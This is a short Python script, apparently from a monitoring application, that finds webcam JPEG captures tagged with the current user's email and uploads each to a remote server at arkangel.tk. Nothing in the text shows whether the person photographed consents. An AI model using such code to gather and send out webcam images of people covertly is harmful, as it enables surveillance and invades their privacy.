import requests
import json
import os,sys
from getsqldata import *
from datetime import datetime

uid = getCurrentUser()

##st = getRowValue("Setting",uid)
email = getRowValue('Users',uid)[1]
##token = getRowValue('current_user',uid)[1]
dir_path = getRowValue('Setting',uid)

#up webcam image log
path = os.path.join(dir_path[2],'Webcam')
path = os.path.abspath(path)
print(path)

for file in os.listdir(path):
    if file.endswith(email+".jpeg"):
        filePath = os.path.join(path, file)
        print(filePath)

        urlscr = 'http://www.arkangel.tk/upload-webcam'
        with open(filePath,'rb') as filedata:
            r = requests.post(urlscr,files={'file':filedata})
        
        if(r.content == b''):
            print('success')
            os.rename(filePath,filePath.replace('-'+email,''))

sys.exit(0)
